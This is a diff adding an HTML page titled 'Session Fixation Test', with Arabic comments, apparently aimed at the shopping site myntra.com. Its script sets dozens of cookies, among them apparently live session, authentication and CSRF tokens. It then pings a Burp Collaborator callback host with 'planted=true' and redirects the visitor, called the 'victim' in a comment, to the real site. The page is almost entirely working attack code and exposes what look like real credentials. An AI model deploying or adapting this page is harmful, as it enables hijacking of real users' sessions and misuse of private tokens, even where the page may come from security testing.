@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Session Fixation Test</title>
+    <script>
+      // ✅ زراعة الكوكيز الثابتة (عدّل القيم حسب ما عندك)
+     document.cookie = "at=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJbXRwWkNJNklqRWlMQ0owZVhBaU9pSktWMVFpZlEuZXlKdWFXUjRJam9pTURZeFltRmlZbUV0WTJaak9TMHhNV1l3TFdGbE1qVXRNRFkyTTJFME16Sm1NR1UwSWl3aVkybGtlQ0k2SW0xNWJuUnlZUzB3TW1RM1pHVmpOUzA0WVRBd0xUUmpOelF0T1dObU55MDVaRFl5WkdKbFlUVmxOakVpTENKaGNIQk9ZVzFsSWpvaWJYbHVkSEpoSWl3aWMzUnZjbVZKWkNJNklqSXlPVGNpTENKbGVIQWlPakUzT0RBeU5qUXlOelFzSW1semN5STZJa2xFUlVFaWZRLlZkR2lYVVRDMlNqODZ3Si1XN3NVMDdjYTB3ODNUT3VmZWc1cTNvMTNiYmM=";
+document.cookie = "_d_id=a79c3866-ae91-4de2-865a-e514530f3d9e";
+document.cookie = "mynt-eupv=1";
+document.cookie = "x-mynt-pca=SwbQx-a4z6m-4mk4dphX2XjVNgE2UEmxCWd55Z7oRikZ4kpXsTLuADx0hj5MggPRFoJ0jDS3G5Yby9cgV4kZTmIZx_LOl39otchJni1sMUyKldUovzw%3D";
+document.cookie = "tvc_VID=1";
+document.cookie = "_scid=HVpTQeHqE_-clBzKLKiogP5vH8PfJMUG";
+document.cookie = "_cs_ex=1";
+document.cookie = "_cs_c=1";
+document.cookie = "_fbp=fb.1.1764712280605.311701709123700786";
+document.cookie = "_ScCbts=%5B%5D";
+document.cookie = "_sctr=1%7C1764709200000";
+document.cookie = "G_ENABLED_IDPS=google";
+document.cookie = "_ga=GA1.2.2022174440.1764712759";
+document.cookie = "_gid=GA1.2.1343445445.1764712759";
+document.cookie = "_gcl_au=1.1.2003510929.1764712279.999360217.1764712697.1764712769";
+document.cookie = "ilgim=false";
+document.cookie = "__cab=cart.fsexp%3D";
+document.cookie = "ftc=false";
+document.cookie = "__insp_wid=617845923";
+document.cookie = "__insp_slim=1764724342979";
+document.cookie = "__insp_nv=true";
+document.cookie = "__insp_targlpu=aHR0cHM6Ly93d3cubXludHJhLmNvbS9sb2dpbg%3D%3D";
+document.cookie = "__insp_targlpt=TXludHJh";
+document.cookie = "mynt-ulc=pincode:|addressId:|lat:|long:|hexagonId:";
+document.cookie = "mynt-ulc-api=pincode:|addressId:|lat:|long:|hexagonId:";
+document.cookie = "mynt-loc-src=pincode%3A%7Csource%3AUSER%7CpincodeSource%3AADDRESS%7Cexpiry%3A604800000";
+document.cookie = "_ma_session=%7B%22id%22%3A%227b5318ed-8d99-47ac-84f0-856006663772-a79c3866-ae91-4de2-865a-e514530f3d9e%22%2C%22referrer_url%22%3A%22%22%2C%22utm_medium%22%3A%22%22%2C%22utm_source%22%3A%22%22%2C%22utm_channel%22%3A%22direct%22%7D";
+document.cookie = "_mxab_=config.bucket%3Dregular%3Bcoupon.cart.channelAware%3DchannelAware_Enabled%3Bcart.cartfiller.personalised%3Denabled";
+document.cookie = "_pv=default";
+document.cookie = "dp=d";
+document.cookie = "lt_timeout=1";
+document.cookie = "lt_session=1";
+document.cookie = "microsessid=908";
+document.cookie = "_xsrf=G513r7SUYLI2Z1jBhHnuhaqngluwfCTY";
+document.cookie = "user_session=_sbLuxU1L_jnY5l01Vy8yA.n4Wefu7ninkx_a5RWJorF65hIz-6Ev0IjWaGM9MMscFdvZl13r3FKck239RGfgIKlFQYN7amo836asOVkIE-6wT7jFbUhfYfjJvXv5fCeD-zm23aQQWZ_WDzwD8cd34ZHHmH35C6KSP3gRdcyymnKg.1764757945236.86400000.qFqOAtBSSy_uMZlRu700FO7hakFZkKq-Esk-0FiMwOQ";
+document.cookie = "ak_bmsc=700B2B863058CECECE532B6C40DA98C1~000000000000000000000000000000~YAAQ5Wb4l2zNT6maAQAADj3F4x7ZrVrx50N3FFTG2/N0dJGDTQp8t/3FPW5chiGjuYx5ZYsRtT6ki49/+phOrr3oqWf2UEDylVg17wkIawJ7Ry5aDn87cb9log3q7k8lFzXUnV9IvFiiVVMueM2+J8axJ+8foyHsENM1Ks0oA0xSGuHjBjKQUnEDdzQgrK2opBuBWwJ+jiwLmEu8CYK5jY8yfVqMCgLpAxe9vHE2dkEI8umzjh2NU/khgoFy1OzS2dixldkPrqVMLmU21mM3jx+VJ3y2wsHMqF7St+OYB5bxS6Uqr4h+v7wanDZFB3irhZRUgyteV5eandQyHOaIMC9+lQvaPhyzog8QH6DpndQhISpWV10N08/AiAcHSZuYmd3umCnhsN8uiPfeA1mkrbXPpMVFzaV/hjskLnNDksyr22Z0j6uY8iy17kXOK0qhVHYONcuCC28qTx4s0ty6zkSZq1o3k/g7Tjw+qw0FjHzFeyYbQn5G8w==";
+document.cookie = "_cf=default";
+document.cookie = "utrid=Cn19bBR9CF8EYhBwUXtAMCMxNDczODkwODY4JDI%3D.150316671e7b858a8da2e79bb9700c9e";
+document.cookie = "ak_RT=\"z=1&dm=myntra.com&si=a8453232-8f49-457e-9439-da2fd94de495&ss=mipvbbnp&sl=1&tt=3ag&rl=1\"";
+document.cookie = "bm_sz=E62838972A22023B1D43C5482FD60F4C~YAAQLmj4l/x6OqWaAQAA53fF4x5vpPgWn8tENyDoVE1M/NvV0QzVc79MYSOzIF8cH19MXl5ya/dux5PnQjlfLhrM3tBYhazyOtNp5B2HF9f1j0QAE+Wfva5GSXfZEIkXk4E8q7c7wCCMU0P4jwpnIwMO7jIAfG+lWmfeRz/H3u7yBofTdx7HyVvG4G1Ooky2ZN6WCLp1uPzbymbCbMcerzZmEvpJjroQ/fD1yI8ufteKPCN+ZIp/4HWY9BV6X8eiTbcka3vcp574bDt8W+dIJSOvE3r7uUhpy+muvu7jsH9U6hi8ekv1wxjRdTGovZ7GQNYyuqTwV/B8nVQOoTxGJmZaVPfPkEkGMLYiGdUQGfINUufNwnyZSL09OqdJwyleUb5l2H0KZPjZVunFXdjRPtwZFRJId4lhCpEBsfmY~4274487~3224625";
+document.cookie = "_scid_r=INpTQeHqE_-clBzKLKiogP5vH8PfJMUG55C15w";
+
+
+      // ✅ إرسال Ping لـ Burp (اختياري)
+      fetch("https://514fnvvoir1zvf860mx438eszj5at1hq.oastify.com/ping?planted=true");
+
+      // ✅ بعد تأخير بسيط، نحول الضحية إلى موقع الهدف
+      setTimeout(() => {
+        window.location.replace("https://www.myntra.com/");
+      }, 1000); // ثانية وحدة للتأخير
+    </script>
+  </head>
+  <body>
+    <h1>Loading...</h1>
+  </body>
+</html>
